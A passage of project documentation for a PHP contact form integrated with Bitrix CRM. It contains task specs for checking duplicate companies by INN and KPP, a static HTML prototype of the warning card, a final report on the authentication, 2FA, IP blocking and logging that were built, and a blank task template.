| Create  | `contact/check-duplicate.php`                 |
| Modify  | `contact/create.php` (JS: DaData onSelect + warning block + CSS) |
| Modify  | `router.php` (+ check-duplicate route)      |
| Modify  | `.htaccess` (+ RewriteRule for check-duplicate) |

##### Special Considerations and Pitfalls

> **DaData `onSelect` is the only entry point.**
> The TIN is placed in the hidden field only when a DaData suggestion is selected. The user does not enter the TIN manually. Therefore, the check is called specifically in the `onSelect` callback, not on the `input` event.

> **Mock mode.**
> Currently, `bitrix_mock_mode = true`. In mock mode, the check always returns `found: false`. This is safe and does not block development. When switched to `false`, the check will start working automatically.

> **Custom field `UF_CRM_INN`.**
> This is the same ID already used in `contactBitrixGetFieldMap()` for `crm.company.add`. If it changes, both creation and checking will stop working. This introduces no new risks.

> **Sequence: DaData populates the fields first, then the check is called.**
> It is important that `checkDuplicateByInn()` be called **after** the line `$("input[name='inn']").val(suggestion.data.inn)`, not before it.

##### Definition of Done (DoD)

- ⬜ Selecting a company from DaData automatically sends an AJAX request to check the TIN
- ⬜ The “Submit” button is disabled during the check and displays “Checking...”
- ⬜ If a duplicate is found, a yellow warning appears with the ID and a link to the CRM record
- ⬜ The warning can be closed manually using `×`, after which the button is enabled
- ⬜ If no duplicate is found, the button is enabled and no warning is shown
- ⬜ If the check stalls (>8 seconds) or fails, the user can continue without the check
- ⬜ An unauthenticated request to `/contact/check-duplicate.php` returns an error
- ⬜ In mock mode, the check does not block the form (it always returns `found: false`)
- ⬜ Entering another company name resets the previous warning

:::

## 8. Duplicate Card UI Prototype <Badge type="info" text="HTML + CSS + JS" />



::: details 🎨 Open the UI Prototype Source

<div class="case-source-path"><span>Source</span><code>.tasks/done/001-duplicate-check/popup.html</code></div>

```html:line-numbers [popup.html]
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Duplicate Card Preview</title>
    <!-- Load the Roboto font -->
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">

    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background-color: #f2f2f2;
            margin: 0;
            padding: 40px 20px;
            display: flex;
            justify-content: center;
        }

        .form-container {
            background-color: #ffffff;
            width: 100%;
            max-width: 560px;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.05);
        }

        .form-title {
            font-size: 36px;
            line-height: 1.1;
            font-weight: 300;
            text-align: center;
            color: #000000;
            margin-top: 0;
            margin-bottom: 20px;
        }

        .input-group {
            margin-bottom: 20px;
        }

        .input-label {
            display: block;
            font-size: 16px;
            color: #333333;
            margin-bottom: 8px;
        }

        .input-field {
            width: 100%;
            box-sizing: border-box;
            padding: 0 15px;
            height: 50px;
            font-size: 16px;
            font-family: 'Roboto', Arial, sans-serif;
            color: #333333;
            border: 1px solid #bfc6d2;
            border-radius: 4px;
            outline: none;
        }

        .input-field:focus {
            border-color: #53a1fe;
        }

        .demo-controls {
            margin-top: 40px;
            padding-top: 20px;
            border-top: 1px dashed #bfc6d2;
            display: flex;
            gap: 10px;
            justify-content: center;
            flex-wrap: wrap;
        }

        .demo-btn {
            padding: 8px 16px;
            border: 1px solid #bfc6d2;
            background: #fff;
            border-radius: 4px;
            cursor: pointer;
            font-family: 'Roboto';
            transition: 0.2s;
        }

        .demo-btn:hover {
            background: #f2f2f2;
        }

        /* --- ALERT STYLES (SUCCESS / ERROR) --- */
        .status-alert {
            display: none;
            align-items: flex-start;
            gap: 16px;
            padding: 20px;
            background-color: #ffffff;
            border: 1px solid #bfc6d2;
            border-radius: 4px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
            margin-bottom: 20px;
            box-sizing: border-box;
            animation: slideDown 0.3s ease-out;
        }

        @keyframes slideDown {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .status-alert.is-success {
            display: flex;
            border-left: 4px solid #2eb85c;
        }
        .status-alert.is-success .status-alert__icon { color: #2eb85c; }

        .status-alert.is-error {
            display: flex;
            border-left: 4px solid #ff6a6a;
        }
        .status-alert.is-error .status-alert__icon { color: #ff6a6a; }

        .status-alert__icon {
            flex: 0 0 auto;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .status-alert__content {
            flex: 1 1 auto;
            color: #333333;
            font-size: 15px;
            line-height: 1.5;
        }

        .status-alert__title {
            font-size: 16px;
            font-weight: 500;
            margin-bottom: 4px;
            margin-top: 0;
        }

        .status-alert__content a {
            display: inline-block;
            margin-top: 6px;
            color: #53a1fe;
            font-weight: 500;
            text-decoration: none;
            border-bottom: 1px solid rgba(83, 161, 254, 0.3);
            transition: 0.2s;
        }

        .status-alert__content a:hover {
            color: #4488d9;
            border-bottom-color: #4488d9;
        }

        .status-alert__close {
            flex: 0 0 auto;
            padding: 0; border: 0; background: none;
            color: #333333; font-size: 24px; cursor: pointer; opacity: 0.3;
        }

        /* --- DUPLICATE CARD DESIGN --- */
        .contact-duplicate-warning {
            max-height: 0; opacity: 0; overflow: hidden;
            transform: translateY(-6px);
            transition: all 0.3s ease;
        }

        .contact-duplicate-warning.is-visible {
            max-height: 350px; opacity: 1; margin-bottom: 20px; transform: translateY(0);
        }

        .contact-duplicate-warning__panel {
            display: flex;
            align-items: flex-start;
            gap: 16px;
            padding: 20px;
            background-color: #ffffff;
            border: 1px solid #bfc6d2;
            border-left: 4px solid #f9bc0b;
            border-radius: 4px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
            box-sizing: border-box;
        }

        .contact-duplicate-warning.is-info .contact-duplicate-warning__panel {
            border-left-color: #53a1fe;
        }

        .contact-duplicate-warning__icon { flex: 0 0 auto; display: flex; align-items: center; }

        .contact-duplicate-warning__content {
            flex: 1 1 auto;
            min-width: 0;
            display: flex;
            flex-direction: column;
        }

        .contact-duplicate-warning__title {
            font-size: 16px;
            font-weight: 500;
            line-height: 1.4;
            margin-bottom: 8px;
        }

        .contact-duplicate-warning__details-line {
            margin-top: 6px;
            font-size: 14px;
            line-height: 1.5;
            color: #333333;
        }

        /* Links and link buttons (shared style) */
        .contact-duplicate-warning__link,
        .contact-duplicate-warning__skip {
            display: inline-flex;
            align-items: center;
            margin-top: 14px;
            width: fit-content;
            color: #53a1fe;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            border-bottom: 1px solid rgba(83, 161, 254, 0.3);
            transition: 0.2s;
            padding: 0;
            border-top: 0; border-left: 0; border-right: 0;
            background: transparent;
            cursor: pointer;
            font-family: 'Roboto', sans-serif;
        }

        .contact-duplicate-warning__link:hover,
        .contact-duplicate-warning__skip:hover {
            color: #4488d9;
            border-bottom-color: #4488d9;
        }

        /* Skip button visibility */
        .contact-duplicate-warning__skip { display: none; }
        .contact-duplicate-warning.is-info .contact-duplicate-warning__skip { display: inline-flex; }

        .contact-duplicate-warning__close {
            flex: 0 0 auto;
            padding: 0; border: 0; background: none;
            color: #333333; font-size: 24px; cursor: pointer; opacity: 0.3;
        }

        .contact-duplicate-warning__close:hover { opacity: 0.8; }
    </style>
</head>
<body>

    <div class="form-container">
        <h2 class="form-title">Add a New Company</h2>

        <!-- STATUS BLOCK -->
        <div id="form-status" class="status-alert">
            <div class="status-alert__icon" id="form-status-icon"></div>
            <div class="status-alert__content" id="form-status-content"></div>
            <button type="button" class="status-alert__close" onclick="closeStatus()">×</button>
        </div>

        <!-- WARNING CARD -->
        <div id="duplicate-warning" class="contact-duplicate-warning is-visible is-warning" aria-live="polite">
            <div class="contact-duplicate-warning__panel">
                <div class="contact-duplicate-warning__icon" id="warning-icon">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#f9bc0b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
                        <line x1="12" y1="9" x2="12" y2="13"></line>
                        <line x1="12" y1="17" x2="12.01" y2="17"></line>
                    </svg>
                </div>
                <div class="contact-duplicate-warning__content">
                    <div class="contact-duplicate-warning__title" id="warning-title">This company has already been added to Bitrix CRM</div>
                    <div class="contact-duplicate-warning__details" id="warning-details">
                        <div class="contact-duplicate-warning__details-line">Company: VK LLC</div>
                        <div class="contact-duplicate-warning__details-line">ID: 12345</div>
                        <div class="contact-duplicate-warning__details-line">TIN: 1234567890</div>
                        <a href="#" class="contact-duplicate-warning__link" id="warning-link">Open the record in CRM</a>
                    </div>
                    <!-- This button is visible only in Info mode -->
                    <button type="button" class="contact-duplicate-warning__skip" id="warning-skip" onclick="toggleVisibility()">Skip check</button>
                </div>
                <button type="button" class="contact-duplicate-warning__close" onclick="toggleVisibility()">×</button>
            </div>
        </div>

        <div class="input-group">
            <label class="input-label">Company name</label>
            <input type="text" class="input-field" value="VK LLC">
        </div>

        <div class="demo-controls">
            <button class="demo-btn" onclick="setWarningMode()">Mode: Duplicate Found</button>
            <button class="demo-btn" onclick="setInfoMode()">Mode: API Error</button>
            <button class="demo-btn" onclick="showSuccess()">Success</button>
            <button class="demo-btn" onclick="showError()">Error</button>
        </div>
    </div>

    <script>
        const warningBlock = document.getElementById('duplicate-warning');
        const iconContainer = document.getElementById('warning-icon');
        const title = document.getElementById('warning-title');
        const details = document.getElementById('warning-details');
        const statusBlock = document.getElementById('form-status');
        const statusIcon = document.getElementById('form-status-icon');
        const statusContent = document.getElementById('form-status-content');

        function closeStatus() { statusBlock.classList.remove('is-success', 'is-error'); }
        function toggleVisibility() { warningBlock.classList.toggle('is-visible'); closeStatus(); }

        function setWarningMode() {
            warningBlock.className = 'contact-duplicate-warning is-visible is-warning';
            closeStatus();
            iconContainer.innerHTML = `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#f9bc0b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>`;
            title.textContent = 'This company has already been added to Bitrix CRM';
            details.style.display = 'block';
        }

        function setInfoMode() {
            warningBlock.className = 'contact-duplicate-warning is-visible is-info';
            closeStatus();
            iconContainer.innerHTML = `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#53a1fe" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>`;
            title.textContent = 'Duplicate checking is unavailable. You can continue without checking.';
            details.style.display = 'none';
        }

        function showSuccess() {
            closeStatus(); warningBlock.classList.remove('is-visible');
            statusIcon.innerHTML = `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>`;
            statusContent.innerHTML = `<div class="status-alert__title">The form was submitted successfully.</div><a href="#">Open in Bitrix CRM: ID 12345</a>`;
            statusBlock.classList.add('is-success');
        }

        function showError() {
            closeStatus(); warningBlock.classList.remove('is-visible');
            statusIcon.innerHTML = `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line></svg>`;
            statusContent.innerHTML = `<div class="status-alert__title">The company could not be created in Bitrix CRM. Please try again later.</div>`;
            statusBlock.classList.add('is-error');
        }
    </script>
</body>
</html>
```

:::

## 9. KPP Handling for Branch Offices <Badge type="tip" text="Done" />



::: details 🏢 Open the KPP handling task

<div class="case-source-path"><span>Source</span><code>.tasks/done/002-duplicate-kpp-branch/task.md</code></div>

#### [002] Duplicate Check: KPP Handling for Branch Offices

> **Goal:** Allow company branch offices to be added to Bitrix CRM. The current duplicate check compares only the INN, so a branch with the same INN but a different KPP is blocked. The INN+KPP combination must be considered: if the CRM already contains a company with the same INN but a different KPP, it is a branch and must be allowed.

##### Problem Context

User request:
> “Bitrix will not add it because a company with this INN already exists, but I need a branch office, INN/KPP 9876543210/987654321.”

The screenshot shows the following:
- The system found **Example LLC** (ID: 12345) with INN `9876543210`
- The user is trying to add **EXAMPLE BRANCH OFFICE** with the same INN but a different KPP (`987654321`)
- The “Submit” button is blocked, and the warning prevents the branch office from being added

###### Why This Happens

The current logic in `contactFindDuplicateByInn()` (`bitrix_company.php:414`) searches for companies **by INN only** through `crm.company.list` with the `UF_CRM_INN` filter. KPP (`UF_CRM_KPP`) is used neither in the request nor in the comparison.

Branches of the same legal entity **always share the INN** of the parent organization. Only the **KPP** differs (the tax registration reason code: the first four digits identify the tax authority, while digits five and six identify the registration reason).

| Record | INN | KPP | Comparison Result |
|---|---|---|---|
| Parent organization | `9876543210` | `123456789` (example) | Base record |
| Branch office | `9876543210` | `987654321` | KPP differs → this is a separate record |

##### Tasks

###### Backend

- ✅ **2.1** Extend `check-duplicate.php` to accept the `kpp` parameter
  - Add `$kpp = isset($_GET['kpp']) ? trim((string) $_GET['kpp']) : '';`
  - Pass the KPP to the duplicate-search function
  - Validate the KPP as nine digits (`/^\d{9}$/`); if validation fails, simply ignore the KPP without blocking the check

- ✅ **2.2** Extend `contactFindDuplicateByInn()` → `contactFindDuplicate()` (or add the `$kpp` parameter)
  - Signature: `contactFindDuplicateByInn(string $inn, string $kpp = ''): array`
  - Add the KPP field to `select[]` in the `crm.company.list` request: `UF_CRM_KPP`
  - **Comparison logic after receiving the Bitrix response:**
    1. Retrieve the list of companies with a matching INN, as before
    2. If `$kpp` is provided and non-empty, filter the result and keep **only** companies whose KPP **exactly matches** the supplied `$kpp`
    3. If the list is empty after KPP filtering → `found: false` (this is a branch and may be added)
    4. If `$kpp` is empty, preserve the current behavior for backward compatibility
  - Add a `kpp` field for every company in the response

- ✅ **2.3** Update `contactBitrixNormalizeCompanyList()` to include KPP
  - Add `UF_CRM_KPP` to normalization, following the INN implementation
  - In `check-duplicate.php`, add `kpp` to each company object in the response

###### Frontend

- ✅ **2.4** Pass KPP in the duplicate-check AJAX request
  - When calling `/contact/check-duplicate.php`, add the `&kpp=` parameter from the hidden form field `input[name='kpp']`
  - DaData populates the KPP when a company is selected (`suggestion.data.kpp`)

- ✅ **2.5** Update the warning text to show the KPP of matching companies
  - Add a **KPP: XXXXXXXXX** line next to the INN in the warning block
  - This helps the user understand why a found company is not a duplicate (different KPP = branch office)

###### Testing

- ✅ **2.6** Verify the scenarios
  - A company with INN `9876543210` and KPP `123456789` already exists → adding a branch with KPP `987654321` is **allowed**
  - A company has the same INN and the same KPP → adding it is **blocked** (a genuine duplicate)
  - DaData does not provide a KPP, as may happen for a sole proprietor → the check works as before, using INN only

##### Files

| Action | File |
|-----------|-----------------------------------------------|
| Modify | `contact/check-duplicate.php` |
| Modify | `contact/login/lib/bitrix_company.php` |
| Modify | `contact/create.php` (JS: pass KPP and display it in the warning) |

##### Special Considerations and Pitfalls

> **Sole proprietors do not have a KPP.**
> Individual entrepreneurs have no KPP. If the KPP is empty, the check must remain unchanged and use only the INN. KPP filtering applies **only** when a KPP is actually supplied.

> **KPP may be missing in Bitrix.**
> If the KPP field (`UF_CRM_KPP`) is empty for an existing company in the CRM, it cannot be excluded from the duplicate list because its KPP is unknown. In that case, it remains in the results and is treated as a potential duplicate.

> **Backward compatibility.**
> The `kpp` parameter in `check-duplicate.php` is optional. Without it, behavior remains exactly the same as before. This prevents breakage if the frontend has not yet been updated.

> **The `×` close button remains available.**
> Even when the INN+KPP check finds an exact duplicate, the user can still close the warning and submit the form. This is a deliberate decision from Task 001: the check is advisory rather than blocking.

##### Definition of Done (DoD)

- ✅ A branch with the same INN but a different KPP is added successfully without a warning
- ✅ A company with the same INN and KPP still triggers the warning
- ✅ A missing KPP, as with a sole proprietor, does not break the check; it works as before
- ✅ The warning displays the KPP of matching companies for clarity
- ✅ The AJAX request sends KPP together with INN

:::

## 10. Final Report, Deployment, and Notification <Badge type="tip" text="REPORT.md" />



::: details 🏁 Open the final report

<div class="case-source-path"><span>Source</span><code>.tasks/REPORT.md</code></div>

All task requirements have been completed:

1. Authentication — implemented in `contact/login/`. Username and password authentication uses `password_hash()` (bcrypt), with users stored in `users.json`. Sessions remain valid for 30 days with hardened settings (`httponly`, `secure`, `samesite=Strict`, `session_regenerate_id`). Anonymous access to `/contact/create` is impossible; visitors are redirected to the login form.

2. Two-factor authentication — implemented through email with a one-time six-digit code. After the correct password is entered, the fields become read-only and a code field appears below them. The code remains valid for five minutes, can be resent no more than once every 60 seconds, and allows no more than five entry attempts. It can be enabled or disabled globally in `config.php` (`2fa_global_enable`) and individually in `users.json` (`2fa_enabled`). All parameters are configurable.

3. IP blocking — if one IP makes more than five failed attempts within ten minutes, it is blocked for 30 minutes. Data is stored in `login_attempts.json`, and expired records are removed automatically. When a block occurs, the event is recorded in `attacks.csv` with the IP, User-Agent, attempted usernames, block expiration time, and proxy headers.

4. Logging — implemented according to the standard pattern: monthly CSV rotation, `flock` during writes, BOM, and CSV Injection sanitization. Four logs are maintained:
   - `auth_YYYY-MM.csv` — every login attempt (time, IP, UA, username, result)
   - `attacks_YYYY-MM.csv` — IP blocking events
   - `bitrix_data_YYYY-MM.csv` — which user sent which data to Bitrix and the response received from Bitrix
   - `form_errors_YYYY-MM.csv` — validation errors, rate-limit events, injection attempts, and SMTP or Bitrix API failures
   All logs are stored in `contact/login/logs/`, and browser access is blocked through `.htaccess`.

Architecture — all logic has been moved into the separate `contact/` directory. The directory is fully self-contained, with its own PHPMailer, SMTP configuration, and POST handler at `contact/process.php`. The entire module can be moved to another server and remains fully functional provided PHP, SMTP access, and Bitrix API access are available. The website's other approximately 25 forms continue to work through `php/forms.php` without changes.

Documentation — the following documents have been prepared:
- Roadmap: `ROADMAP.md`
- Test cases: `QA_TESTCASES.md` (100+ manual test cases covering authentication, CSRF, CAPTCHA, rate limiting, 2FA, form submission, vulnerabilities, and logs)

---

Additional measures:

1. CSRF protection — every POST form is protected with a unique token. Tokens are compared through `hash_equals` to prevent timing attacks. The token is rotated at login and during the 2FA step.

2. Yandex SmartCaptcha on the login form — moved from the submission form to the authentication page. A CAPTCHA failure counts as a failed login attempt and contributes to IP blocking.

3. Complete module isolation — the task assumed work within an isolated directory, but there were more actual dependencies on `php/` than expected. A fully self-contained `contact/process.php` was created with local copies of all security functions (`sanitizeInput`, `detectInjection`, `validateFields`, `checkRateLimit`), the email transport (`mailer.php` plus local PHPMailer), and the Bitrix integration (`bitrix_company.php`). The form now sends POST requests to `/contact/process.php` instead of `/procces/`.


##### Deployment

The update has been uploaded to and configured on the production server.
Configuration files, documentation, and the database are protected from access;
Login with CAPTCHA and two-factor authentication has been verified and works as expected;
Company creation has been verified and works as expected;
All logs are being written;
The old page has been removed from the website root.
The functionality is available at:

https://legacy.example.com/contact/create/

A redirect from the main website has also been configured:

https://example.com/contact/create/


The first user, Test User, verified their login and company creation and confirmed that everything works.

I also sent the responsible employee links to the duplicate companies created while testing the form so that test data could be removed from the CRM.

I expanded the deployment documentation using the experience gained during the production rollout.


##### Notification

All users received notifications through the corporate messenger containing their personal authentication credentials and login instructions.


##### Final Report

* The `/contact/create` page is protected by authentication; anonymous access is impossible
* Two-factor authentication using a one-time email code has been added
* Brute-force protection blocks an IP after failed login attempts
* Yandex SmartCaptcha has been added to the login form to stop automated brute-force attacks
* Every login attempt and block event is recorded in audit files
* Every form submission is logged with the user, company data, and CRM response
* The form is isolated in a self-contained module independent of the rest of the website
* Real-time duplicate checking by INN has been implemented; if the company already exists in Bitrix CRM, a warning with a link to its record is displayed
* After a successful submission, a link to the newly created company record in the CRM is displayed, improving the user experience

:::

## 11. Internal Task Template <Badge type="info" text="Template" />



::: details 🧩 Open the internal template

<div class="case-source-path"><span>Source</span><code>.tasks/_template.md</code></div>

#### [Task Name]

> **Goal:** [Briefly describe what needs to be done and the benefit it will provide]

###### Tasks

- ⬜ **1.1** [Name of the first step]
  - Implementation details
  - What specifically needs to be changed

- ⬜ **1.2** [Name of the second step]
  - Description of the details...

###### Files

| Action | File |
|-----------|---------------------------------------|
| Modify | `path/to/file.php` |
| Create | `path/to/new-file.php` |

###### Definition of Done (DoD)

- ⬜ Condition 1 has been completed successfully
- ⬜ The functionality does not break existing logic
- ⬜ A clear message is shown to the user when an error occurs

:::
